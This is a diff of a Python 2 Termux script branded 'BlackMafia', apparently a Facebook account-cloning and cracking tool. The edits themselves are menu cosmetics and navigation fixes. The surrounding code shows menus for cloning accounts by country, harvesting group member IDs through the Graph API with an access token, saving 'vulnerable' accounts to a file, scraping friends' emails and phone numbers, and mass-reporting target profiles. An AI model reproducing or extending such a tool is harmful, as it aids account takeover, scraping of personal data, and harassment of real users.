@@ -829,14 +829,14 @@ def login():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo13
-		jalan(' \033[1;91mWarning● \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning● \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning● \033[1;92mTermux All Version Work ' )                 
+		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
+		jalan(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
+		jalan(' \033[1;91mWarning  \033[1;92mTermux All Version Work ' )                 
 		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
 		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
 		print('	' )
-		id = raw_input('\033[1;97m[●] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
-		pwd = raw_input('\033[1;97m[●] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
+		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
+		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -1058,29 +1058,29 @@ def crack():
 		login()
 	os.system('clear')
 	print logo19
-	print "\033[1;93m-•◈•-\033[1;97m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       \033[1;92m"
+	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          \033[1;93m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Cloning Indonasia      \033[1;91m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Cloning Indonasia      "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Cloning United State   \033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Cloning United State   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Cloning Bangladash     \033[1;91m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Cloning Bangladash     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All Country    \033[1;92m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All Country    "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Cloning Indian Old     \033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Cloning Indian Old     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   \033[1;96m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Cloning BlackMafia     \033[1;95m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Cloning BlackMafia     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning Testing        \033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning Testing        "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group uncomplet\033[1;93m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group uncomplet"
         time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
+	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
 	pilih_crack()
 
 def pilih_crack():
@@ -1336,7 +1336,7 @@ def pilih_hack():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih_hack()
@@ -1537,7 +1537,7 @@ def pilih_black():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih_black()
@@ -1741,7 +1741,7 @@ def pilih_mafia():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_mafia()
@@ -1947,7 +1947,7 @@ def pilih_test():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_test()
@@ -2145,7 +2145,7 @@ def pilih_super():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_super()
@@ -2339,7 +2339,7 @@ def clone_dari_member_group():
 	except KeyError:
 		print"\033[1;96m[!] \x1b[1;91mGroup not found"
 		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
+		crack()
 	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
@@ -2384,7 +2384,7 @@ def clone_dari_member_group():
 	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(oks))
 	print"\033[1;96m[+] \033[1;92mFile lovehacker\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
+	crack()
 			
 def brute():
     os.system('clear')
@@ -2723,7 +2723,7 @@ def pilih_mail():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_mail()
@@ -2928,7 +2928,7 @@ def pilih_isi():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_isi()
@@ -3128,7 +3128,7 @@ def pilih_army():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="0":
-		menu()
+		crack()
 	else:
 		print "\x1b[1;97mFill in correctly"
 		pilih_army()
@@ -3318,21 +3318,21 @@ def asif():
 		login()
 	os.system('clear')
 	print logo23
-	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;91m Get      ID From Friends      \033[1;95m"
+	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;91m Get      ID From Friends      "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\033[1;91m Friends  ID From Friends      \033[1;93m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\033[1;91m Friends  ID From Friends      "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;91m Get      ID From GRUP         \033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;91m Get      ID From GRUP         "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;91m Get      Friends Email        \033[1;96m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;91m Get      Friends Email        "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;91m Friends  Email   From  Friends\033[1;95m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;91m Friends  Email   From  Friends"
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\033[1;91m Get      Phone   From  Friends\033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\033[1;91m Get      Phone   From  Friends"
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;91m Friend's Phone   From  Friends\033[1;93m"
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;91m Friend's Phone   From  Friends"
         time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0.\033[1;92m  Back                          \033[1;92m"
+	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;92m Back                          "
 	pilih_asif()
 
 def pilih_asif():
@@ -3819,19 +3819,19 @@ def fighter():
 		login()
 	os.system('clear')
 	print logo23
-	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m Target Profile.  \033[1;93m"
+	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m Target Profile.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Start  Reporting.\033[1;95m"
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Start  Reporting."
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start  Report1.  \033[1;96m"
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start  Report1.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start  Report2.  \033[1;91m"
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start  Report2.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start  Report3.  \033[1;94m"
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start  Report3.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start  Report4.  \033[1;92m"
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start  Report4.  "
         time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             \033[1;91m"
+	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             "
 	pilih_fighter()
 
 def pilih_fighter():
